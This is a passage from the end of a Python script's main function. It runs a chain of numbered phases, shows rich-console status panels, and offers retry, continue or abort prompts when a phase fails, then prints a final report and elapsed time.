            r           = fn()
            phase_elapsed = time.monotonic() - phase_start

            _phase_status_card(n, title, r.status, r.finding, phase_elapsed)

            if r.status != "failed" or args.auto or args.skip_failed:
                break

            console.print()
            console.print(Panel(
                f"[bold red]Phase {n} failed:[/bold red] {escape(r.finding or '—')}\n\n"
                "  [bold]r[/bold]  →  Retry this phase\n"
                "  [bold]c[/bold]  →  Continue to next phase\n"
                "  [bold]q[/bold]  →  Abort chain and show report",
                title="[bold red] Phase Failed [/bold red]",
                border_style="red", expand=False,
            ))
            choice = Prompt.ask(
                "[red]Action[/red]", choices=["r", "c", "q"], default="c"
            )

            if choice == "r":
                warn(f"Retrying Phase {n}: {title}...")
                continue
            elif choice == "q":
                results.append(r)
                console.print(Panel(
                    "[bold red]Chain aborted by operator.[/bold red]",
                    border_style="red", expand=False,
                ))
                chain_elapsed = time.monotonic() - chain_start
                console.print(
                    f"\n[dim]Total elapsed: [bold]{chain_elapsed:.1f}s[/bold][/dim]"
                )
                print_report()
                return
            else:
                break

        results.append(r)

    chain_elapsed = time.monotonic() - chain_start
    console.print(Panel(
        f"[bold white]All phases complete.[/bold white]  "
        f"Elapsed: [bold yellow]{chain_elapsed:.1f}s[/bold yellow]",
        border_style="dim", expand=False,
    ))
    print_report()


if __name__ == "__main__":
    main()
